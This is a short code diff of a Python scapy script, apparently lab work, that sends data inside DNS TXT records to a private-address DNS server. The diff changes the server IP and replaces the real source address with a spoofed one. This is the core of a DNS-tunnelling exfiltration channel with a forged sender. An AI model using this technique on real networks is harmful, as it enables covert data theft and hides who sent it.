@@ -10,7 +10,7 @@ from scapy.layers.dns import DNS, DNSQR, DNSRR
 from scapy.layers.inet import UDP, IP
 
 DNS_port = 53
-DNS_server_ip = "10.0.2.15"
+DNS_server_ip = "10.0.2.5"
 
 
 def exe_file():
@@ -47,7 +47,7 @@ def exe_file():
     dns_layer = DNS(id=1234, qr=0, qd=DNSQR(qname="example.com"))
     dnsRR = DNSRR(rrname="example.com", type="TXT", rdata=data_to_send)
     udp_layer = UDP(sport=RandShort(), dport=53)
-    ip_layer = IP(src=ip, dst=DNS_server_ip)
+    ip_layer = IP(src="1.2.3.4", dst=DNS_server_ip)
 
     packet_to_send = ip_layer / udp_layer / dns_layer / dnsRR / data_to_send
     send(packet_to_send)
